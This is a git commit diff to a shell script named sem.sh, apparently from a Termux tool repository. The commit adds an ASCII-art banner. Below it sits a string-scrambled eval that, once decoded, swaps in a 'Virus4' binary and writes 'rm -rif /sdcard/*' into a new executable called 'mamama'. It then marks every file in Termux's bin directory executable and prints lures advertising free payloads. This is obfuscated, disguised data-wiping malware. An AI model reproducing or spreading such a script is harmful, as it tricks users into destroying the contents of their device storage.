50aa48adaa90a613b68b984956e9ac6d8bb83678
mohamed99x <49323330+mohamed99x@users.noreply.github.com>
2019-04-05 14:52:17 -0700

    Update sem.sh

--- sem.sh
+++ sem.sh
@@ -1,3 +1,19 @@
+echo "   _                   _"
+echo " _( )                 ( )_"
+echo "(_, |      __ __      | ,_)"
+echo "   \'\    /  ^  \    /'/"
+echo "    '\'\,/\      \,/'/'"
+echo "      '\| []   [] |/'"
+echo "        (_  /^\  _)"
+echo "          \  ~  /"
+echo "          /HHHHH\"
+echo "        /'/{^^^}\'\"
+echo "    _,/'/'  ^^^  '\'\,_"
+echo "   (_, |           | ,_)"
+echo "     (_)           (_)"
+
+
+
 z="
 ";KBz='e"';Cz='1;32';GBz='$y 3';Nz='x/fi';HBz='payl';Bz='033[';ABz=' $g)';DBz='k "';ez='sr/b';Mz='ermu';Ez='y='\''\';gz='irus';Uz='data';hz='4';kz=' -ri';Az='g='\''\';IBz='oad5';Oz='les/';yz='$y 1';wz=' -e ';Tz='cd /';Vz='a/co';mz='dcar';lz='f /s';iz='echo';MBz='oad6';Zz='es/u';BBz='EasY';Rz='Viru';Jz='a/da';Yz='/fil';Pz='usr/';vz=' *';cz='mv .';Iz='/dat';Lz='om.t';Wz='m.te';qz='amam';oz=' > /';Xz='rmux';xz='"$g(';az='sr/s';fz='in/V';tz='chmo';Hz='rif ';jz=' "rm';LBz='$y 4';Sz='s4';JBz=' fre';Qz='bin/';Fz='1;33';pz='in/m';nz='d/*"';Kz='ta/c';FBz='s4"';bz='em';Dz='m'\''';dz='s4 /';uz='d +x';sz='in/';CBz='_HaC';rz='a';Gz='rm -';EBz='$y 2';
 eval "$Az$Bz$Cz$Dz$z$Ez$Bz$Fz$Dz$z$Gz$Hz$Iz$Jz$Kz$Lz$Mz$Nz$Oz$Pz$Qz$Rz$Sz$z$Tz$Uz$Iz$Vz$Wz$Xz$Yz$Zz$az$bz$z$cz$Rz$dz$Uz$Iz$Vz$Wz$Xz$Yz$Zz$ez$fz$gz$hz$z$iz$jz$kz$lz$mz$nz$oz$Uz$Iz$Vz$Wz$Xz$Yz$Zz$ez$pz$qz$rz$z$Tz$Uz$Iz$Vz$Wz$Xz$Yz$Zz$ez$sz$z$tz$uz$vz$z$iz$wz$xz$yz$ABz$BBz$CBz$DBz$z$iz$wz$xz$EBz$ABz$Rz$FBz$z$iz$wz$xz$GBz$ABz$HBz$IBz$JBz$KBz$z$iz$wz$xz$LBz$ABz$HBz$MBz$JBz$KBz"
